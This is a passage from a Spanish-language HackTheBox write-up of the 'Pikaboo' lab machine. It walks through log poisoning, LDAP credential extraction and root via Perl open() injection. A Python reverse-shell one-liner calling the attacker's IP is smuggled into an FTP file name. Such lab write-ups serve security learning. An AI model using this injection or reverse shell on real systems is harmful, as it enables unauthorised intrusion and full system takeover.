<h2 id="log-poinsoning">Log Poinsoning</h2>

<p>Si no sabes lo que es, por áca te dejo dos artículos que hablan a profundidad sobre esta vulnerabilidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://lathack.com/vulnerabilidad-log-poisoning/

https://red-8.gitbook.io/red-blog/cheatsheets/vulnerabilidades/log-poisoning-lfi-to-rce

</code></pre></div></div>
<hr />

<h2 id="explotación">Explotación</h2>

<p>Nos dirigimos a la web y colocaremos “/var/log/vsftpd.log”</p>

<p><img src="/assets/images/htb-writeup-pikaboo/log.jpg" alt="" /></p>

<p>Podemos ver los logs del archivo por conexiones ftp. En el log vsftpd hay un usuario llamado “pwnmeow”.</p>

<p>Sabemos que la web interpreta php, lo que voy a hacer es injectar código php cuando entre por ftp y recargar la página para que me regrese una shell inversa.</p>

<p>Primero injecto el código php por ftp.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/php.jpg" alt="" /></p>

<p>Luego me pongo en escucha por netcat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
❯ nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...


</code></pre></div></div>
<p>Al fallar la contraseña y recargar la página web me deberia dar una shell.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/shell.jpg" alt="" /></p>

<p>Podemos ver que hemos ganado acceso a la máquina victima.</p>

<p>Hagamos un tratamiento de la TTY.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash

export TERM=xterm

export SHELL=bash

Ctrl + z

stty raw -echo;fg

reset xterm

</code></pre></div></div>
<p>Si nos dirigimos al directorio /home/pwnmeow/ podemos ver la primera flag.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/flag.jpg" alt="" /></p>

<hr />

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<p>Luego de estar intentado varios comandos para ver si puedo escalar privilegios, encontre un cronjob que se ejecuta cada minuto como el usuario root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
www-data@pikaboo:/<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
<span class="c"># /etc/crontab: system-wide crontab</span>
<span class="c"># Unlike any other crontab you don't have to run the `crontab'</span>
<span class="c"># command to install the new version when you edit this file</span>
<span class="c"># and files in /etc/cron.d. These files also have username fields,</span>
<span class="c"># that none of the other crontabs do.</span>

<span class="nv">SHELL</span><span class="o">=</span>/bin/sh
<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

<span class="c"># Example of job definition:</span>
<span class="c"># .---------------- minute (0 - 59)</span>
<span class="c"># |  .------------- hour (0 - 23)</span>
<span class="c"># |  |  .---------- day of month (1 - 31)</span>
<span class="c"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
<span class="c"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
<span class="c"># |  |  |  |  |</span>
<span class="c"># *  *  *  *  * user-name command to be executed</span>
17 <span class="k">*</span>	<span class="k">*</span> <span class="k">*</span> <span class="k">*</span>	root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.hourly
25 6	<span class="k">*</span> <span class="k">*</span> <span class="k">*</span>	root	<span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.daily <span class="o">)</span>
47 6	<span class="k">*</span> <span class="k">*</span> 7	root	<span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.weekly <span class="o">)</span>
52 6	1 <span class="k">*</span> <span class="k">*</span>	root	<span class="nb">test</span> <span class="nt">-x</span> /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts <span class="nt">--report</span> /etc/cron.monthly <span class="o">)</span>
<span class="c">#</span>
<span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root /usr/local/bin/csvupdate_cron &lt;<span class="nt">----</span>
www-data@pikaboo:/<span class="err">$</span>
</code></pre></div></div>
<p>Si vemos el contenido del archivo podemos ver que es un simple script en bash.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
www-data@pikaboo:/<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/csvupdate_cron
<span class="c">#!/bin/bash</span>

<span class="k">for </span>d <span class="k">in</span> /srv/ftp/<span class="k">*</span>
<span class="k">do
  </span><span class="nb">cd</span> <span class="nv">$d</span>
  /usr/local/bin/csvupdate <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span> <span class="k">*</span>csv
  /usr/bin/rm <span class="nt">-rf</span> <span class="k">*</span>
<span class="k">done
</span>www-data@pikaboo:/<span class="nv">$ </span>

</code></pre></div></div>
<p>Le pregunté a ChatGPT qué hace exactamente este script y esto fue lo que me respondió:</p>

<hr />

<p>¿Qué hace este script en bash? “for d in /srv/ftp/* do cd $d /usr/local/bin/csvupdate $(basename $d) *csv /usr/bin/rm -rf * done”</p>

<p>ChatGPT: Este siguiente script en Bash realiza las acciones:</p>

<p>Itera a través de todos los directorios dentro de “/srv/ftp/” utilizando el patrón “/srv/ftp/*”.
Para cada directorio encontrado, cambia al directorio usando cd $d.
Luego ejecuta el comando /usr/local/bin/csvupdate $(basename $d) *csv. Este comando parece invocar un programa llamado “csvupdate” ubicado en “/usr/local/bin/”, pasando como argumento el nombre del directorio actual (obtenido mediante ) $(basename $d)y todos los archivos que tienen una extensión “.csv” en ese directorio ( *csv).
Finalmente, después de actualizar los archivos CSV en el directorio actual, elimine todos los archivos en ese directorio utilizando el comando /usr/bin/rm -rf *. Esto borra todos los archivos de forma recursiva y forzada (sin solicitar confirmación).
En resumen, este script parece diseñado para procesar archivos CSV en directorios específicos dentro de “/srv/ftp/” utilizando el programa “csvupdate”, y luego eliminar todos los archivos en esos directorios.</p>

<hr />

<p>Investiguemos un poco lo que hay en “/usr/local/bin/csvupdate”</p>

<p>Si vemos bien, es un script en perl y al final del script hay algo que me llamó mucho la antención.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
f<span class="o">(</span><span class="nv">$#ARGV</span> &lt; 1<span class="o">)</span>
<span class="o">{</span>
  die <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;type&gt; &lt;file(s)&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="o">}</span>

my <span class="nv">$type</span> <span class="o">=</span> <span class="nv">$ARGV</span><span class="o">[</span>0]<span class="p">;</span>
<span class="k">if</span><span class="o">(!</span>exists <span class="nv">$csv_fields</span><span class="o">{</span><span class="nv">$type</span><span class="o">})</span>
<span class="o">{</span>
  die <span class="s2">"Unrecognised CSV data type: </span><span class="nv">$type</span><span class="s2">.</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="o">}</span>

my <span class="nv">$csv</span> <span class="o">=</span> Text::CSV-&gt;new<span class="o">({</span> sep_char <span class="o">=&gt;</span> <span class="s1">','</span> <span class="o">})</span><span class="p">;</span>

my <span class="nv">$fname</span> <span class="o">=</span> <span class="s2">"</span><span class="k">${</span><span class="nv">csv_dir</span><span class="k">}</span><span class="s2">/</span><span class="k">${</span><span class="nv">type</span><span class="k">}</span><span class="s2">.csv"</span><span class="p">;</span>
open<span class="o">(</span>my <span class="nv">$fh</span>, <span class="s2">"&gt;&gt;"</span>, <span class="nv">$fname</span><span class="o">)</span> or die <span class="s2">"Unable to open CSV target file.</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>  &lt;<span class="nt">------</span>

<span class="nb">shift</span><span class="p">;</span>
<span class="k">for</span><span class="o">(</span>&lt;<span class="o">&gt;)</span>
<span class="o">{</span>
  chomp<span class="p">;</span>
  <span class="k">if</span><span class="o">(</span><span class="nv">$csv</span>-&gt;parse<span class="o">(</span><span class="nv">$_</span><span class="o">))</span>
  <span class="o">{</span>
    my @fields <span class="o">=</span> <span class="nv">$csv</span>-&gt;fields<span class="o">()</span><span class="p">;</span>
    <span class="k">if</span><span class="o">(</span>@fields <span class="o">!=</span> <span class="nv">$csv_fields</span><span class="o">{</span><span class="nv">$type</span><span class="o">})</span>
    <span class="o">{</span>
      warn <span class="s2">"Incorrect number of fields: '</span><span class="nv">$_</span><span class="s2">'</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
      next<span class="p">;</span>
    <span class="o">}</span>
    print <span class="nv">$fh</span> <span class="s2">"</span><span class="nv">$_</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
  <span class="o">}</span>
<span class="o">}</span>

close<span class="o">(</span><span class="nv">$fh</span><span class="o">)</span><span class="p">;</span>

</code></pre></div></div>
<p>Podemos buscar en google “perl open injection”.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/perl.jpg" alt="" /></p>

<p>Por acá les dejo el link:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://stackoverflow.com/questions/26614348/perl-open-injection-prevention

</code></pre></div></div>
<p>Lo que vamos a hacer es lo siguiente, sabemos que la máquina tiene el puerto 21 abierto, pero no nos podemos conectar porque no disponemos de credenciales.</p>

<p>Luego de estar enumerando un rato en el sistema en el directorio “/opt/pokeapi/config” hay un script en Python llamado “setting.py”, si nos fijamos dentro del script hay unas crenciales.</p>

<p><img src="/assets/images/htb-writeup-pikaboo/credenciales.jpg" alt="" /></p>

<p>Podemos fijarnos si el servicio Ldap está activo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>netstat <span class="nt">-nat</span>
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 127.0.0.1:81            0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 127.0.0.1:389           0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0    138 10.10.10.249:45860      10.10.14.27:443         ESTABLISHED
tcp        1      0 127.0.0.1:81            127.0.0.1:47132         CLOSE_WAIT 
tcp        1      0 127.0.0.1:81            127.0.0.1:47162         CLOSE_WAIT 
tcp        0      0 10.10.10.249:45830      10.10.14.27:443         ESTABLISHED
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN     
tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN     
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN     
www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span> 

</code></pre></div></div>
<p>Y sí, efectivamente esta activo en forma local.</p>

<p>Dentro de la máquina podemos usar ldapsearch.</p>

<p>Enumerando un poco con ldapsearch me encuentro unas cadenas en base64</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 127.0.0.1 <span class="nt">-w</span> <span class="s1">'J~42%W?PFHl]g'</span> <span class="nt">-b</span> <span class="s2">"dc=pikaboo,dc=htb"</span> <span class="nt">-D</span> <span class="s2">"cn=binduser,ou=users,dc=pikaboo,dc=htb"</span>
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;dc=pikaboo,dc=htb&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>

<span class="c"># pikaboo.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: domain
dc: pikaboo

<span class="c"># ftp.pikaboo.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: domain
dc: ftp

<span class="c"># users, pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># pokeapi.pikaboo.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>pokeapi,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: domain
dc: pokeapi

<span class="c"># users, ftp.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># groups, ftp.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">groups</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">groups</span>

<span class="c"># pwnmeow, users, ftp.pikaboo.htb</span>
dn: <span class="nv">uid</span><span class="o">=</span>pwnmeow,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: <span class="nv">X0cwdFQ0X0M0dGNIXyczbV80bEwhXw</span><span class="o">==</span> &lt;<span class="nt">---</span>

<span class="c"># binduser, users, pikaboo.htb</span>
dn: <span class="nv">cn</span><span class="o">=</span>binduser,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
cn: binduser
objectClass: simpleSecurityObject
objectClass: organizationalRole
userPassword:: <span class="nv">Sn40MiVXP1BGSGxdZw</span><span class="o">==</span> &lt;<span class="nt">----</span>

<span class="c"># users, pokeapi.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>pokeapi,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">users</span>

<span class="c"># groups, pokeapi.pikaboo.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span><span class="nb">groups</span>,dc<span class="o">=</span>pokeapi,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: organizationalUnit
objectClass: top
ou: <span class="nb">groups</span>

<span class="c"># search result</span>
search: 2
result: 0 Success

<span class="c"># numResponses: 11</span>
<span class="c"># numEntries: 10</span>
www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span>
</code></pre></div></div>

<p>Lo que me interesa es esta información.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c"># pwnmeow, users, ftp.pikaboo.htb</span>
dn: <span class="nv">uid</span><span class="o">=</span>pwnmeow,ou<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>ftp,dc<span class="o">=</span>pikaboo,dc<span class="o">=</span>htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: <span class="nv">X0cwdFQ0X0M0dGNIXyczbV80bEwhXw</span><span class="o">==</span>

</code></pre></div></div>
<p>Veamos qué contiene la cadena en base64</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@pikaboo:/opt/pokeapi/config<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"X0cwdFQ0X0M0dGNIXyczbV80bEwhXw=="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>_G0tT4_C4tcH_<span class="s1">'3m_4lL!_
www-data@pikaboo:/opt/pokeapi/config$

</span></code></pre></div></div>
<p>Nos reportó unas credenciales, probemos si nos podemos conectar por ftp con el usuario “pwnmeow”.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
❯ ftp 10.10.10.249
Connected to 10.10.10.249.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.249:void<span class="o">)</span>: pwnmeow
331 Please specify the password.
Password: 
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; 
</code></pre></div></div>
<p>Pudimos acceder por ftp, si listamos los archivo vamos a ver el mismo contenido que hay en “/srv/ftp/”.</p>

<p>Intente subir un archivo pero no me dejó, entré al último directorio llamado “versions”, y pude subir un archivo que habia creado llamado “hello.txt”.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
ftp&gt; <span class="nb">cd </span>versions
250 Directory successfully changed.
ftp&gt; put hello.txt
<span class="nb">local</span>: hello.txt remote: hello.txt
229 Entering Extended Passive Mode <span class="o">(||</span>|37958|<span class="o">)</span>
150 Ok to send data.
100% |<span class="k">***************************************************************************************************************************************************************</span>|     5       73.98 KiB/s    00:00 ETA
226 Transfer complete.
5 bytes sent <span class="k">in </span>00:00 <span class="o">(</span>0.00 KiB/s<span class="o">)</span>
ftp&gt; 

</code></pre></div></div>
<p>Recordando el posts sobre “perl open injection”	haremos lo siguiente:</p>

<p>Primero yo voy a usar un revshell en Python que termine usando la extensión “.cvs” y con put lo voy a subir al ftp, pero antes hay que ponerse en escucha por “NC”.</p>

<hr />

<p>Nos ponemos en escucha por nc.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
❯ <span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>void: 
listening on <span class="o">[</span>any] 443 ...



</code></pre></div></div>

<p>Para subir la revshell en Python les debe quedar asi:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"|python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("</span>\<span class="s">"10.10.14.27</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span><span class="mi">443</span><span class="p">));[</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span><span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">sh</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="s">';.csv"

</span></code></pre></div></div>
<p>Subamos la revshell de python al ftp.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
ftp&gt; <span class="nb">cd </span>versions
250 Directory successfully changed.
ftp&gt; put <span class="s2">"|python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("</span><span class="se">\"</span>10.10.14.27<span class="se">\"</span><span class="s2">",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("</span><span class="se">\"</span>sh<span class="se">\"</span><span class="s2">")';.csv"</span>
<span class="nb">local</span>: |python3 <span class="nt">-c</span> <span class="s1">'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.27",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</span><span class="p">;</span>.csv remote: |python3 <span class="nt">-c</span> <span class="s1">'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.27",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</span><span class="p">;</span>.csv
229 Entering Extended Passive Mode <span class="o">(||</span>|44973|<span class="o">)</span>
150 Ok to send data.
sh: 1: .csv: not found
226 Transfer complete.
ftp&gt; 

</code></pre></div></div>

<p>Volvemos al nc y vemos que ganamos acceso como root, recuenden que una vez que gane acceso se salen de la shell y se vuelven a poner en escucha, esto se debe porque la tarea crob se ejecuta cada unos minutos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
<span class="c"># pwd</span>
<span class="nb">pwd</span>
/home/void/HackTheBox/Pikaboo/content
<span class="c"># exit</span>
<span class="nb">exit</span>
❯ <span class="nb">sudo </span>nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.249] 45868
<span class="c"># whoami</span>
<span class="nb">whoami
</span>root
<span class="c"># pwd</span>
<span class="nb">pwd</span>
/srv/ftp/versions
<span class="c"># cd /root</span>
<span class="nb">cd</span> /root
<span class="c"># ls</span>
<span class="nb">ls
</span>root.txt  vsftpd.log
<span class="c"># cat root.txt</span>
<span class="nb">cat </span>root.txt
5680f12063f4e16faf5922e6ec559389
<span class="c"># ifconfig</span>
ifconfig
ens192: <span class="nv">flags</span><span class="o">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.10.10.249  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:554c  prefixlen 64  scopeid 0x0&lt;global&gt;
        inet6 fe80::250:56ff:feb9:554c  prefixlen 64  scopeid 0x20&lt;<span class="nb">link</span><span class="o">&gt;</span>
        ether 00:50:56:b9:55:4c  txqueuelen 1000  <span class="o">(</span>Ethernet<span class="o">)</span>
        RX packets 371477  bytes 66506127 <span class="o">(</span>63.4 MiB<span class="o">)</span>
        RX errors 0  dropped 229  overruns 0  frame 0
        TX packets 320700  bytes 166253173 <span class="o">(</span>158.5 MiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: <span class="nv">flags</span><span class="o">=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  <span class="o">(</span>Local Loopback<span class="o">)</span>
        RX packets 2953855  bytes 345563993 <span class="o">(</span>329.5 MiB<span class="o">)</span>
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2953855  bytes 345563993 <span class="o">(</span>329.5 MiB<span class="o">)</span>
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

<span class="c"># id</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c">#  </span>

</code></pre></div></div>
<p>Eso es todo, espero que se haya entendido.</p>

<p>Gracias por leer :)</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#hacking-web" class="page__taxonomy-item" rel="tag">Hacking Web</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#log-poisoning" class="page__taxonomy-item" rel="tag">Log poisoning</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#pentesting" class="page__taxonomy-item" rel="tag">pentesting</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-12T00:00:00+00:00">November 12, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/writeup-Mischeif/" class="pagination--pager" title="Mischeif HackTheBox
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Vo1dN3t</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
